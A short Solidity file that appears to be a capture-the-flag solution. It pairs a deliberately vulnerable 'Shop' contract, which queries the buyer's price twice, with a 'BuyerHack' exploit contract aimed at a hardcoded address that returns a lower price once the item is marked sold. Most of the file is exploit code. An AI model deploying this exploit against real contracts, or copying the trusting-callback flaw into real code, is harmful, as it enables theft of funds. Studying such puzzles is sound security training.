pragma solidity 0.4.24;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}

contract BuyerHack is Buyer {
    
    address contractToHack = 0x662013d34fceeeddd87535cba2f2397dfeada335;
    
    function HackShop() public {
        Shop shop = Shop(contractToHack);
        shop.buy();
    }
    
    function price() external view returns (uint) {
        Shop shop = Shop(contractToHack);
        
        if (!shop.isSold()) {
            return 120;
        }
        else
        {
            return 50;
        }
    }
    
}